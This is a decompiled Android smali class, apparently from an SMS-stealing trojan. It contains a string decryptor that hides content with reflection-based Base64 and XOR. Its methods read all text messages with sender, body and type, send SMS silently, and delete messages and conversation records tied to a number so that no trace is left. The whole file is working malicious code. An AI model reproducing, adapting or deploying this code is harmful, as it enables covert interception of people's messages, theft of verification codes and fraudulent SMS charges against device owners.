.class public final Lcom/kk/liushiwu/com/zz/b;
.super Ljava/lang/Object;


# direct methods
.method private static _100645a(Ljava/lang/String;)Ljava/lang/String;
    .locals 37

    const/4 v12, 0x0

    const/16 v17, 0x0

    const/4 v15, 0x0

    const/16 v28, 0x0

    const/4 v3, 0x0

    const/16 v27, 0x0

    const/4 v5, 0x0

    const/16 v22, 0x0

    const/16 v23, 0x0

    const/16 v34, 0x13

    move/from16 v0, v34

    new-array v7, v0, [B

    fill-array-data v7, :array_0

    const/16 v34, 0x0

    const/16 v35, 0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v30

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v34, v34, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v31

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x2

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v36

    add-int/lit8 v36, v36, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v35

    move/from16 v2, v36

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    move-object/from16 v0, v34

    move-object/from16 v1, v30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    const/4 v12, 0x0

    :goto_0
    const/16 v34, 0x13

    move/from16 v0, v34

    if-lt v12, v0, :cond_3

    new-instance v28, Ljava/lang/String;

    move-object/from16 v0, v28

    invoke-direct {v0, v7}, Ljava/lang/String;-><init>([B)V

    const/4 v15, 0x2

    const/16 v34, 0x3

    move-object/from16 v0, v28

    move/from16 v1, v34

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v27

    const/16 v15, 0x10

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x11

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v27

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v35, "c"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v15, 0x4

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x5

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v27

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :try_start_0
    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v4, v0, [Ljava/lang/Class;

    const/16 v34, 0x0

    const-class v35, Ljava/lang/String;

    aput-object v35, v4, v34

    const/16 v34, 0x1

    sget-object v35, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v35, v4, v34

    invoke-virtual {v10, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v34, v0

    const/16 v35, 0x0

    aput-object v29, v34, v35

    const/16 v35, 0x1

    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v36

    aput-object v36, v34, v35

    move-object/from16 v0, v34

    invoke-virtual {v14, v10, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v34

    move-object/from16 v0, v34

    check-cast v0, [B

    move-object v5, v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_4

    :goto_1
    array-length v0, v5

    move/from16 v20, v0

    move/from16 v21, v20

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v0, v0

    move/from16 v34, v0

    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v34

    invoke-static/range {v34 .. v34}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v17

    add-int/lit8 v20, v20, -0x1

    sub-int v20, v20, v17

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    const/16 v35, 0x1

    move/from16 v0, v34

    move/from16 v1, v35

    if-ne v0, v1, :cond_4

    const/16 v23, 0x1

    :goto_2
    add-int/lit8 v20, v20, -0x1

    add-int/lit8 v34, v20, -0x2

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v8, v0

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v9, v0

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-static/range {v35 .. v35}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v9}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v32

    const/16 v34, 0x10

    move-object/from16 v0, v32

    move/from16 v1, v34

    invoke-static {v0, v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v34

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v34, v6, 0x48

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v20, v20, -0x2

    const-string v33, ""

    const/4 v12, 0x0

    :goto_3
    move/from16 v0, v20

    if-lt v12, v0, :cond_5

    move/from16 v12, v20

    :goto_4
    move/from16 v0, v21

    if-lt v12, v0, :cond_6

    const/16 v34, 0x1

    move/from16 v0, v23

    move/from16 v1, v34

    if-ne v0, v1, :cond_2

    new-instance v34, Ljava/lang/Exception;

    invoke-direct/range {v34 .. v34}, Ljava/lang/Exception;-><init>()V

    invoke-virtual/range {v34 .. v34}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v34

    const/16 v35, 0x1

    aget-object v13, v34, v35

    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v25

    const-string v34, "."

    move-object/from16 v0, v25

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v16

    const/16 v34, -0x1

    move/from16 v0, v16

    move/from16 v1, v34

    if-eq v0, v1, :cond_0

    add-int/lit8 v34, v16, 0x1

    move-object/from16 v0, v25

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v25

    :cond_0
    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getMethodName()Ljava/lang/String;

    move-result-object v26

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v25 .. v25}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v26

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    const/16 v35, 0x100

    move/from16 v0, v34

    move/from16 v1, v35

    if-le v0, v1, :cond_1

    const/16 v34, 0x0

    const/16 v35, 0x100

    move-object/from16 v0, v24

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    :cond_1
    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    const/4 v12, 0x0

    move/from16 v19, v18

    :goto_5
    move/from16 v0, v20

    if-lt v12, v0, :cond_7

    :cond_2
    move/from16 v0, v20

    new-array v0, v0, [B

    move-object/from16 v22, v0

    const/4 v12, 0x0

    :goto_6
    move/from16 v0, v20

    if-lt v12, v0, :cond_9

    new-instance v33, Ljava/lang/String;

    move-object/from16 v0, v33

    move-object/from16 v1, v22

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    return-object v33

    :cond_3
    aget-byte v34, v7, v12

    xor-int/lit8 v34, v34, 0x7b

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v7, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_0

    :catch_0
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto/16 :goto_1

    :catch_1
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto/16 :goto_1

    :catch_2
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto/16 :goto_1

    :catch_3
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto/16 :goto_1

    :catch_4
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto/16 :goto_1

    :cond_4
    const/16 v23, 0x0

    goto/16 :goto_2

    :cond_5
    aget-byte v34, v5, v12

    xor-int v34, v34, v6

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_3

    :cond_6
    const/16 v34, 0x0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_4

    :cond_7
    aget-byte v34, v5, v12

    add-int/lit8 v18, v19, -0x1

    move-object/from16 v0, v24

    move/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v35

    move/from16 v0, v35

    int-to-byte v0, v0

    move/from16 v35, v0

    xor-int v34, v34, v35

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    if-gez v18, :cond_8

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    :cond_8
    add-int/lit8 v12, v12, 0x1

    move/from16 v19, v18

    goto/16 :goto_5

    :cond_9
    aget-byte v34, v5, v12

    aput-byte v34, v22, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_6

    nop

    :array_0
    .array-data 1
        0x1at
        0x15t
        0x1ft
        0x9t
        0x14t
        0x12t
        0x1ft
        0x55t
        0xet
        0xft
        0x12t
        0x17t
        0x55t
        0x39t
        0x1at
        0x8t
        0x1et
        0x4dt
        0x4ft
    .end array-data
.end method

.method public static a(Landroid/content/Context;)Ljava/lang/StringBuilder;
    .locals 11

    goto :goto_2

    :goto_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "Yz/dxNbex4qcn8DdwJ84QQFJ210N"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    goto :goto_4

    :goto_1
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_0

    const-string v0, "==V2Y3diYTJCAY8vMKNJNQc3"

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    const-string v0, "body"

    goto :goto_b

    :goto_2
    const/4 v3, 0x0

    const/4 v10, 0x2

    const/4 v9, 0x1

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    goto :goto_0

    :goto_3
    const-string v5, "==TXwtbDwDhBAZ7Bl3dlNQ0t"

    invoke-static {v5}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v2, v4

    const-string v4, "body"

    goto :goto_d

    :goto_4
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v4, 0x0

    goto :goto_3

    :goto_5
    const-string v5, ":"

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    goto :goto_e

    :goto_6
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_0
    return-object v6

    :cond_1
    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    goto :goto_9

    :goto_7
    invoke-static {v5}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v4, v3

    goto :goto_1

    :goto_8
    invoke-virtual {v5, v7, v8}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    goto :goto_c

    :goto_9
    const-string v0, ""

    if-ne v7, v9, :cond_3

    const-string v0, "U=YHJrpBQQHBso1r3zu3"

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :cond_2
    :goto_a
    const-string v7, "\\+86"

    const-string v8, ""

    goto :goto_8

    :goto_b
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    const-string v0, "type"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    goto :goto_6

    :goto_c
    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v8, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    goto :goto_5

    :goto_d
    aput-object v4, v2, v9

    const-string v4, "type"

    aput-object v4, v2, v10

    const-string v5, "U=sdD0krOilDMAHVi8uJtTDQ"

    goto :goto_7

    :goto_e
    const-string v5, ","

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    goto :goto_10

    :goto_f
    goto :goto_6

    :cond_3
    if-ne v7, v10, :cond_2

    const-string v0, "==nw7VZENgGdYuCRNAV5"

    goto :goto_11

    :goto_10
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_f

    :goto_11
    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_a
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7

    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/4 v1, 0x0

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    const/4 v3, 0x0

    invoke-static {p0, v1, v2, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0x46

    if-lt v1, v2, :cond_1

    invoke-virtual {v0, p2}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_0
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-nez v1, :cond_0

    :goto_1
    return-void

    :cond_0
    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    const/4 v2, 0x0

    const/4 v5, 0x0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1

    :cond_1
    const/4 v2, 0x0

    const/4 v5, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1
.end method

.method public static b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "==8eBBUeBEpfXwMdA0NBAcw4yYFbNQEx"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "==V1Y3RiYiwuMkIBqcK2MwcH"

    invoke-static {v2}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object p2, v3, v4

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    :try_start_1
    const-string v0, "M=LD2cjD2ZeCgt7A3oLEw8/C1Tg3AZowWTzs"

    invoke-static {v0}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "body"

    aput-object v4, v2, v3

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "==by966js9Ld17Py9/fh9uDgrkE5AWVHqiHRNQ4f"

    invoke-static {v4}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    :cond_0
    :goto_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v1

    if-nez v1, :cond_1

    :goto_2
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :cond_1
    :try_start_2
    const-string v1, "body"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "_id"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v1

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "M=v64PH64K67u+f550FFAbrJlT9/"

    invoke-static {v3}, Lcom/kk/liushiwu/com/zz/b;->_100645a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "_id="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v1, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2
.end method
